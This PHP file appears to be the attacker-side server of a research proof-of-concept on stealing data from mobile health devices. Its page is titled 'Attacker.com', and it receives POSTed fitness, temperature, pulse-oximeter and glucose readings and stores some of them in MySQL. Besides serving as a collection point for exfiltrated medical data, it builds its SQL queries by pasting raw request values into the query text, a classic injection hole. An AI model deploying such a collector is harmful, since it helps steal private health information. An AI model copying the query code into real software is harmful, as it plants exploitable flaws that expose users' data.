<?php

/**

AUTHOR: Soteris Demetriou

*/	

function handle_bodymedia_data($con){

	$batteryLevel = $_POST['batteryLevel'];
	$memoryLevel = $_POST['memoryLevel'];
	$stepsToday = $_POST['stepsToday'];
	$stepsYesterday = $_POST['stepsYesterday'];
	$stepsCumulative = $_POST['stepsCumulative'];
	$caloriesToday = $_POST['caloriesToday'];
	$caloriesYesterday = $_POST['caloriesYesterday'];
	$caloriesCumulative = $_POST['caloriesCumulative'];
	$metsToday = $_POST['metsToday'];
	$metsYesterday = $_POST['metsYesterday'];
	$metsCurrent = $_POST['metsCurrent'];
	$moderateActivityToday = $_POST['moderateActivityToday'];
	$moderateActivityYesterday = $_POST['moderateActivityYesterday'];
	$moderateActivityCumulative = $_POST['moderateActivityCumulative'];
	$vigorousActivityToday = $_POST['vigorousActivityToday'];
	$vigorousActivityYesterday = $_POST['vigorousActivityYesterday'];
	$vigorousActivityCumulative = $_POST['vigorousActivityCumulative'];
	$heartbeats = $_POST['heartbeats'];
	$heartRate = $_POST['heartRate'];
	$walkingDistanceToday = $_POST['walkingDistanceToday'];
	$walkingDistanceYesterday = $_POST['walkingDistanceYesterday'];
	$walkingDistanceCumulative = $_POST['walkingDistanceCumulative'];
	$walkingSpeedCurrent = $_POST['walkingSpeedCurrent'];
	
	$query = "INSERT INTO BODYMEDIA VALUES ('" . $batteryLevel . "', '" . $memoryLevel ."','" . $stepsToday . "', '" . $stepsYesterday . "', '" . $stepsCumulative . "', '" . $caloriesToday . "', '" .   $caloriesYesterday . "', '" . $caloriesCumulative . "', '" . $metsToday . "', '" . $metsYesterday . "', '" . $metsCurrent . "', '" . $moderateActivityToday . "', '" . $moderateActivityYesterday . "', '" . $moderateActivityCumulative . "', '" . $vigorousActivityToday . "', '" . $vigorousActivityYesterday . "', '" . $vigorousActivityCumulative . "', '" . $heartbeats . "', '" . $walkingDistanceToday . "', '" . $walkingDistanceYesterday . "', '" . $walkingDistanceCumulative . "', '" . $walkingSpeedCurrent . "' )";
	
	mysqli_query($con, $query);
	
	/*
	echo "<input type=\"hidden\" name=\"batteryLevel\" value\"".  $_POST['batteryLevel'] ."\">";
	echo "<input type=\"hidden\" name=\"memoryLevel\" value\"".  $_POST['memoryLevel'] ."\">";
	echo "<input type=\"hidden\" name=\"stepsToday\" value\"".  $_POST['stepsToday'] ."\">";
	echo "<input type=\"hidden\" name=\"stepsYesterday\" value\"".  $_POST['stepsYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"stepsCumulative\" value\"".  $_POST['stepsCumulative'] ."\">";
	echo "<input type=\"hidden\" name=\"caloriesToday\" value\"".  $_POST['caloriesToday'] ."\">";
	echo "<input type=\"hidden\" name=\"caloriesYesterday\" value\"".  $_POST['caloriesYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"caloriesCumulative\" value\"".  $_POST['caloriesCumulative'] ."\">";
	echo "<input type=\"hidden\" name=\"metsToday\" value\"".  $_POST['metsToday'] ."\">";
	echo "<input type=\"hidden\" name=\"metsYesterday\" value\"".  $_POST['metsYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"metsCurrent\" value\"".  $_POST['metsCurrent'] ."\">";
	echo "<input type=\"hidden\" name=\"moderateActivityToday\" value\"".  $_POST['moderateActivityToday'] ."\">";
	echo "<input type=\"hidden\" name=\"moderateActivityYesterday\" value\"".  $_POST['moderateActivityYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"moderateActivityCumulative\" value\"".  $_POST['moderateActivityCumulative'] ."\">";
	echo "<input type=\"hidden\" name=\"vigorousActivityToday\" value\"".  $_POST['vigorousActivityToday'] ."\">";
	echo "<input type=\"hidden\" name=\"vigorousActivityYesterday\" value\"".  $_POST['vigorousActivityYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"vigorousActivityCumulative\" value\"".  $_POST['vigorousActivityCumulative'] ."\">";
	echo "<input type=\"hidden\" name=\"heartbeats\" value\"".  $_POST['heartbeats'] ."\">";
	echo "<input type=\"hidden\" name=\"heartRate\" value\"".  $_POST['heartRate'] ."\">";
	echo "<input type=\"hidden\" name=\"walkingDistanceToday\" value\"".  $_POST['walkingDistanceToday'] ."\">";
	echo "<input type=\"hidden\" name=\"walkingDistanceYesterday\" value\"".  $_POST['walkingDistanceYesterday'] ."\">";
	echo "<input type=\"hidden\" name=\"walkingDistanceCumulative\" value\"".  $_POST['walkingDistanceCumulative'] ."\">";
	echo "<input type=\"hidden\" name=\"walkingSpeedCurrent\" value\"".  $_POST['walkingSpeedCurrent'] ."\">";
	*/
	
		
}

function handle_iThermometer_data($con){

	$temp = $_POST['temp'];
	echo "Received temperature: " . $temp;
	
	//echo "<input type=\"hidden\" name=\"temp\" value\"".  $_POST['temp'] ."\">";
	$query = "INSERT INTO THERMOMETER (temp) VALUES ('" . $temp . "')";
	echo $query;
	if ($result = mysqli_query($con, $query)){
		echo "SUCCESS" . $result;
	}
	else{
		echo "FAILURE" . $result ;
	}
	
	

}

function handle_pulseOxymeter_data($con){
	$heartrate = $_POST['heartrate'];
	$boxygen = $_POST['boxygen'];
	
	//echo "<input type=\"hidden\" name=\"temp\" value\"".  $_POST['temp'] ."\">";

}

function handle_bloodGlucose_data($con){
        $val = $_POST['val'];
       // echo $val;
      // echo "<input type=\"hidden\" name=\"temp\" value\"".  $_POST['temp'] ."\">";
}

echo "<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd\">
<html xmlns=\"http://www.w3.org/1999/xhtml\">";
echo "<head>";
echo "<title> Attacker.com </title>";
echo "	<script type=\"text/javascript\">
	function submitform(){
		document.getElementById(\"attackform\").submit();
	}	
	
	</script>
	";
echo "</head>";

echo "<body>";



if($_POST['id'] != null){
     $id = $_POST['id'];
	
	$url = "localhost";
	$username = "";
	$password="";
	$database="";
	
	$con = mysqli_connect($url,$username,$password,$database);

	// Check connection
	if (mysqli_connect_errno($con))
	  {
	  echo "Failed to connect to MySQL: " . mysqli_connect_error();
	  }
	
	
	
	//echo "<form action=\"attack.php\" method=\"post\" id=\"attackform\">";
	//echo "<input type=\"hidden\" name=\"id\" value\"".  $_POST['id'] ."\">";
	switch($id){
		case 1:
			//echo "id: " . $id;
			handle_bodymedia_data($con);
			break;
		case 2:
			echo "id: " . $id . "\n";
			handle_iThermometer_data($con);
			break;
		case 3:
			//echo "id: " . $id;
			handle_pulseOxymeter_data($con);
			break;
                case 4:
			//echo "id: " . $id;
			handle_bloodGlucose_data($con);
			break;
		default:
			break;
	}
	//echo "<input  type=\"submit\">";
	//echo "</form>";
/*
	echo "<script type='text/javascript'>
		submitform();
	      </script>";
	    */  
	    
	mysqli_close($con);
	

	
}

echo "</body>";

echo "</http>";

?>
